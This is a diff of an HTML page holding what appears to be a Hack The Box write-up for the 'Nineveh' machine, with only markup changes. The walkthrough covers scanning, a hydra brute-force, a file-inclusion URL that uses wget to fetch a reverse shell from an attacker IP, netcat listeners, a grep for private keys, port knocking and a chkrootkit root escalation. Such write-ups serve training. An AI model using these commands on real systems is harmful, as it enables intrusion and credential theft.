@@ -102,7 +102,7 @@
   <article class="post-content">
   <p>Let’s start with NMAP:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -sT -sV 10.10.10.43 -p 1-65535 -A
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -sT -sV 10.10.10.43 -p 1-65535 -A
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-06 04:37 EST
 Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
@@ -138,7 +138,7 @@ Nmap done: 1 IP address (1 host up) scanned in 292.82 seconds
 
 <p>After enumerated HTTP and HTTP I found:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# dirsearch.py --url http://nineveh.htb -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e php,txt,db,js
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# dirsearch.py --url http://nineveh.htb -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e php,txt,db,js
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -176,24 +176,24 @@ Task Completed
 
 <p>There was phpLiteAdmin v1.9 on https://nineveh.htb/db/index.php:</p>
 
-<p><img src="/images/posts/2018/2018-02-05-htb-nineveh/img1.png" alt="Screenshot" /></p>
+<p><img src="/images/2018-02-05-htb-nineveh/img1.png" alt="Screenshot" /></p>
 
 <p>I tried to bruteforce the login with hydra:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l '' -P rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password."
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l '' -P rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password."
 [443][http-post-form] host: nineveh.htb   password: password123
 </code></pre></div></div>
 
 <p>I found <a href="https://www.exploit-db.com/exploits/24044/">this</a> vulnerability but it didn’t work because the path of the saved db (/var/tmp/syrion.php) was not in the directories of the web server. I tried to move the db in /var/www/, /var/www/html and /var/www/ssl but I got this error:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: copy(/var/www/html/syrion.php): failed to open stream: Permission denied in /var/www/ssl/db/index.php on line 1259
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: copy(/var/www/html/syrion.php): failed to open stream: Permission denied in /var/www/ssl/db/index.php on line 1259
 </code></pre></div></div>
 
 <p>So the application didn’t have the permissions for write there.</p>
 
 <p>At this point I tried to bruteforce the login in http://nineveh.htb/department :</p>
 
-<p><img src="/images/posts/2018/2018-02-05-htb-nineveh/img2.png" alt="Screenshot" /></p>
+<p><img src="/images/2018-02-05-htb-nineveh/img2.png" alt="Screenshot" /></p>
 
 <p>The credentials were admin:1q2w3e4r5t.</p>
 
@@ -202,24 +202,24 @@ I tried to include my db /var/tmp/syrion.php (but it didn’t work.</p>
 
 <p>By rename the db ninevehNotes1.php I was able to incude my shell and execute command:</p>
 
-<p><img src="/images/posts/2018/2018-02-05-htb-nineveh/img3.png" alt="Screenshot" /></p>
+<p><img src="/images/2018-02-05-htb-nineveh/img3.png" alt="Screenshot" /></p>
 
 <p>In the source code of the page there was this check:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(!strpos($file, "ninevehNotes"))
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(!strpos($file, "ninevehNotes"))
     exit("No Note is selected.");
 </code></pre></div></div>
 
 <p>I uploaded a reverse shell with wget and then include it:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes1.php&amp;cmd=wget%20http://10.10.14.6:8000/syrion%20-O%20/var/tmp/ninevehNotes2.php
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes1.php&amp;cmd=wget%20http://10.10.14.6:8000/syrion%20-O%20/var/tmp/ninevehNotes2.php
 
 http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes2.php
 </code></pre></div></div>
 
 <p>And I got a reverse shell:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nc -lvp 4444
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nc -lvp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.6] from nineveh.htb [10.10.10.43] 50710
 Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
@@ -235,7 +235,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 <p>From the sshd_config file we knew that the user could access ssh with a private key, so I start to enumerate the sistem in order to find this key:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@nineveh:/etc/ssh$ find / -xdev -type f -print0 | xargs -0 grep -H "BEGIN RSA PRIVATE KEY"
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@nineveh:/etc/ssh$ find / -xdev -type f -print0 | xargs -0 grep -H "BEGIN RSA PRIVATE KEY"
 &lt;find / -xdev -type f -print0 | xargs -0 grep -H "BEGIN RSA PRIVATE KEY"     
 
 Binary file /var/www/ssl/secure_notes/nineveh.png matches
@@ -243,7 +243,7 @@ Binary file /var/www/ssl/secure_notes/nineveh.png matches
 
 <p>Mmm was the private key hidden in the png?</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop# binwalk -e  nineveh.png 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop# binwalk -e  nineveh.png 
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
@@ -262,7 +262,7 @@ nineveh.priv  nineveh.pub
 
 <p>Ok I got the private key, but there was no ssh in the nmap scan. After a bit of enumeration I found this configuration file:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@nineveh:/etc$ cat knockd.conf
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@nineveh:/etc$ cat knockd.conf
 cat knockd.conf
 [options]
  logfile = /var/log/knockd.log
@@ -283,12 +283,12 @@ cat knockd.conf
 
 <p>I needed to send the knock sequence to open the ssh port, I did it with nmap:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for x in 571 290 911 ; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.43; done
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for x in 571 290 911 ; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.43; done
 </code></pre></div></div>
 
 <p>At this point I was the user amrois:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/_nineveh.png.extracted/secret# ssh amrois@10.10.10.43 -i nineveh.priv 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/_nineveh.png.extracted/secret# ssh amrois@10.10.10.43 -i nineveh.priv 
 Ubuntu 16.04.2 LTS
 Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 
@@ -309,7 +309,7 @@ amrois@nineveh:~$
 
 <p>There was an insteresting file in the crontab:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amrois@nineveh:/tmp$ crontab -l
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amrois@nineveh:/tmp$ crontab -l
 # Edit this file to introduce tasks to be run by cron.
 # 
 # Each task to run has to be defined through a single line
@@ -335,13 +335,13 @@ amrois@nineveh:~$
 */10 * * * * /usr/sbin/report-reset.sh
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amrois@nineveh:/tmp$ cat /usr/sbin/report-reset.sh
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amrois@nineveh:/tmp$ cat /usr/sbin/report-reset.sh
 #!/bin/bash
 
 rm -rf /report/*.txt
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amrois@nineveh:/tmp$ ls -lah /report/
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amrois@nineveh:/tmp$ ls -lah /report/
 total 64K
 drwxr-xr-x  2 amrois amrois 4.0K Feb  6 11:06 .
 drwxr-xr-x 24 root   root   4.0K Jul  2  2017 ..
@@ -356,7 +356,7 @@ drwxr-xr-x 24 root   root   4.0K Jul  2  2017 ..
 
 <p>After a research on google I discovered that the reports were generated by chkrootkit. Because of crontab, I supposed it was vulnerable to <a href="https://www.exploit-db.com/exploits/33899/">this</a> exploit. As described I created a file in /tmp that execute a python reverse shell called update and I got it:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nc -vlp 5555
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nc -vlp 5555
 listening on [any] 5555 ...
 connect to [10.10.14.6] from nineveh.htb [10.10.10.43] 60862
 /bin/sh: 0: can't access tty; job control turned off
@@ -406,7 +406,7 @@ uid=0(root) gid=0(root) groups=0(root)
         <div class="row">
   <div class="col-lg-8 col-lg-offset-2">
     <footer>
-      Syrion © 2018 
+      Syrion © 2020 
     </footer>
   </div>
 </div>
